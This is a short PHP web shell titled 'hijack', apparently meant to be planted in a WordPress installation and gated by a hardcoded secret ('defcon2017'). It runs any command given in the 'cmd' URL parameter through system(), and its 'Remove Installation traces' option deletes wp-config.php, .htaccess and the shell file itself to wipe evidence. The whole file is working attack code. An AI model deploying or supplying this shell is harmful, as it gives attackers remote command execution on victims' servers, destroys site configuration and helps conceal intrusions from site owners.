<?php

$secret="defcon2017";

if ((!array_key_exists("secret", $_GET)) || ($_GET['secret']!=$secret))
	die();

?><!DOCTYPE html><html><title>hijack</title>
<?php

if (array_key_exists("removetraces", $_GET)) {
	unlink("../../../wp-config.php");
	unlink("../../../.htaccess");
	unlink("hijack.php");
	echo("Deleted wp-config.php, .htaccess and hijack.php.<br>");
	echo("<a href='".basename(__FILE__)."?secret=$secret'>back</a>");
	die();
}

?>
<pre style="border:1px dotted black;width:80%;height:300px">
<?php
if (array_key_exists('cmd', $_GET)) {
	system($_GET['cmd']);
}
?>
</pre>
<form action="<?php echo basename(__FILE__); ?>" method="GET">
<input type="hidden" name="secret" value="<?php echo $secret ?>">
<input type="text" name="cmd" autofocus>
<input type="submit" value="ok">
</form>
<br>
<br>
<form action="<?php echo basename(__FILE__); ?>" method="GET">
<input type="hidden" name="secret" value="<?php echo $secret ?>">
<input type="hidden" name="removetraces" value="1">
<input type="submit" value="Remove Installation traces">
</form>

